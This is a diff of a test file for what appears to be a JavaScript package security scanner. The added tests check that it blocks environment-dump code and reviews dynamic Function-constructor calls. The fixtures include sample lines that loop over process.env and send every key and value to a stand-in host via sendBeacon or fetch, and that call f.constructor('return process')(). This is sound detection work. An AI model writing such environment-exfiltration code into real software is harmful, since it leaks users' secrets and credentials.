@@ -331,8 +331,8 @@ describe("review 2.1 — what used to be silent", () => {
     expect(rules(r, "review")).toContain("dynamic-constructor");
     expect(cap(r, "dynamic_code")).toBeDefined();
   });
-  it("any read of .constructor is dynamic code and a review (round 2, item 11) — except new on a class/array literal", async () => {
-    const r = await tree({ "i.js": "export const n = (o) => o.constructor.name;\n" });
+  it("a bare read of .constructor is dynamic code and a review (round 2, item 11) — except new on a class/array literal", async () => {
+    const r = await tree({ "i.js": "export const n = (o) => o.constructor;\n" });
     expect(rules(r, "review")).toContain("dynamic-constructor");
     expect(cap(r, "dynamic_code")).toBeDefined();
     const ok = await fixture("constructor-new-literal");
@@ -496,5 +496,37 @@ describe("bb's own plugins (round 2, item 13)", () => {
     expect(r.findings.filter((f) => f.severity === "block"), formatReport(r)).toEqual([]);
     expect(cap(r, "child_process")).toBeDefined(); // it spawns script runners with { env: { ...process.env } }
     expect(cap(r, "env")!.detail).toContain("*");
+  });
+});
+
+describe("review 2.1, final notes (stage 2.2)", () => {
+  const js = (body: string) => tree({ "index.js": body });
+  it("enumerating the environment and sending it from the loop body is an env-dump", async () => {
+    const r = await js("for (const [k, v] of Object.entries(process.env)) navigator.sendBeacon('https://x.example/', k + v);\n");
+    expect(rules(r, "block")).toContain("env-dump");
+  });
+  it("the same through forEach / map callbacks", async () => {
+    expect(rules(await js("Object.entries(process.env).forEach(([k, v]) => fetch('https://x.example/' + k + v));\n"), "block")).toContain("env-dump");
+    expect(rules(await js("Object.keys(process.env).map((k) => fetch('https://x.example/' + k));\n"), "block")).toContain("env-dump");
+  });
+  it("enumerating the environment without sending it is only a capability", async () => {
+    const r = await js("for (const k of Object.keys(process.env)) console.log(k);\n");
+    expect(rules(r, "block")).toEqual([]);
+    expect(cap(r, "env")).toBeDefined();
+  });
+  it("the whole environment passed to an unknown function is a review, not silence", async () => {
+    const r = await js("import { foo } from './foo.js';\nfoo(process.env);\n");
+    expect(rules(r, "review")).toContain("env-passed");
+    expect(rules(r, "block")).toEqual([]);
+  });
+  it("spawn(…, { env: process.env }) and Object.keys(process.env) are not env-passed", async () => {
+    const r = await js("import { spawn } from 'node:child_process';\nspawn('ls', [], { env: { ...process.env } });\nObject.keys(process.env);\n");
+    expect(rules(r)).not.toContain("env-passed");
+  });
+  it(".constructor.name and comparisons are harmless; calling or passing the constructor is not", async () => {
+    expect(rules(await js("const o = {};\nconsole.log(o.constructor.name, o.constructor === Object, typeof o.constructor);\n"))).not.toContain("dynamic-constructor");
+    expect(rules(await js("const f = () => {};\nf.constructor('return process')();\n"), "review")).toContain("dynamic-constructor");
+    expect(rules(await js("const F = (() => {}).constructor;\nF('return 1')();\n"), "review")).toContain("dynamic-constructor");
+    expect(rules(await js("const f = () => {};\nf.constructor.call(null, 'return 1')();\n"), "review")).toContain("dynamic-constructor");
   });
 });
